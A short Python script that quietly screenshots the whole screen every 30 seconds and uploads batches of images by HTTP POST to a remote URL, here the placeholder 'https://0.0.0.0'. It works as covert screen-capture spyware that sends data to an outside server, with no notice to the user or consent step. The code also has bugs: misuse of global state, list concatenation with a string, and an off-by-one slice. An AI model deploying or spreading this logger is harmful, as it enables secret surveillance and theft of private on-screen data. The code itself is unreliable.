import requests # to send logs
import threading # to make log sending repeat in background
import mss # to screenshot
import mss.tools
import os
from contextlib import ExitStack # to close screenshots
from datetime import datetime, timezone # to classify logs by time sent

URL = 'https://0.0.0.0'
SCREENSHOT_INTERVAL = 30.0 # Interval between taking screenshots (in seconds).
SEND_COUNT = 2 # How many screenshots need to be taken before sending.
# Make sure the screenshot&send count combo don't make the sending interval
# (screenshot interval * send count) too low so you don't DDOS yourself

screenshots = []

def screenshot():
    with mss.mss() as sct:
        time = str(datetime.now(timezone.utc).time())[:-7].replace(':','.') # get the current utc time, remove milliseconds portion, and switch colons to periods since you cant use colons in file names
        screenshot = sct.grab(sct.monitors[0])
        screenshot_name = f"screenshot-{time}.png"
        mss.tools.to_png(screenshot.rgb, screenshot.size, output=screenshot_name)
        screenshots += screenshot_name
    if len(screenshots) >= SEND_COUNT:
        send_screenshot()
    threading.Timer(SCREENSHOT_INTERVAL, screenshot).start() # make the function run again after the amount of seconds specified in SCREENSHOT_INTERVAL
    
def send_screenshot():
    count = len(screenshots) # Assume new screenshots were added which you haven't sent yet and log how many you're sending so you know how many to remove later
    ss_payload = {} # progressively add more screenshots to the payload
    i = 1
    with ExitStack() as stack:
        for ss in screenshots[:count-1]:
            img = stack.enter_context(open(ss, 'rb')) # open the screenshot in read-only mode binary
            ss_payload[f"screenshot{i}"] = (ss, img) # make the payload for the screenshot containing its name and the screenshot in binary and add it to the list of the payload
            i += 1 # add 1 to the counter so the screenshot keys enumerate ex. {'file1:(..),file2:(..), and so on'}
        r = requests.post(URL, files=ss_payload) # POST (send) the screenshot
    if not r.ok:
        pass
    else:
        screenshots = screenshots[count-1:]

screenshot()